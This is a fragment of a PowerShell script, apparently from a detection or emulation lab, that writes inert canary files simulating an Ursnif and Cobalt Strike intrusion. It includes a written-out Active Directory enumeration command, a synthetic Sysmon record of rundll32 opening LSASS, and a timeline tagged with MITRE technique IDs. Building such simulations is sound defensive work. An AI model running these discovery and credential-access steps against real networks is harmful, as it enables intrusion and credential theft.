Write-UrsnifGiftFile(Join-Path $p.Payloads 'adcomp.bat')'@REM INERT. Reported: powershell Get-ADComputer -Filter * -Properties Name,OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,IPv4Address >> log2.txt''domain discovery canary'
Invoke-UrsnifGiftDecoy $powershell 'cmd.exe /C adcomp.bat -> powershell Get-ADComputer -Filter * >> log2.txt' 'beacon.exe';Write-UrsnifGiftFile(Join-Path $p.Staging 'log2.txt')"GENERATED COMPUTER INVENTORY`nLAB-DC01`nLAB-BACKUP01`nNo directory query occurred."'generated AD output canary'
Add-UrsnifGiftJsonLine(Join-Path $p.Logs 'Sysmon-ProcessAccess.jsonl')@{eventId=10;sourceImage='C:\Windows\System32\rundll32.exe';targetImage='C:\Windows\System32\lsass.exe';grantedAccess='0x1010';accessAttempted=$false;credentialsRead=$false;synthetic=$true}'LSASS access evidence canary'
Write-UrsnifGiftFile(Join-Path $p.Evidence 'credential-injection-negative-record.json')(@{reportedProcessInjectionTargets=@('explorer.exe','rundll32.exe');processesInjected=0;LSASSHandlesOpened=0;LSASSMemoryRead=$false;credentialsCollected=0;passwordStoresAccessed=$false}|ConvertTo-Json)'credential safety record'
Add-UrsnifGiftTimeline 96 execution 'Hands-on BITS job and in-memory Cobalt Strike transition represented' @{BITSJobsCreated=0;downloads=0;beaconExecuted=$false;technique='T1197'};Add-UrsnifGiftTimeline 96.2 discovery 'Manual host/user discovery and adcomp.bat domain-computer query represented' @{realQueriesExecuted=0;techniques=@('T1033','T1124','T1082','T1087.002','T1018')};Add-UrsnifGiftTimeline 96.4 credential-access 'Cobalt process injection and LSASS GrantedAccess 0x1010 evidence represented' @{processesInjected=0;LSASSAccessed=$false;techniques=@('T1055','T1055.004','T1003.001','T1555')}
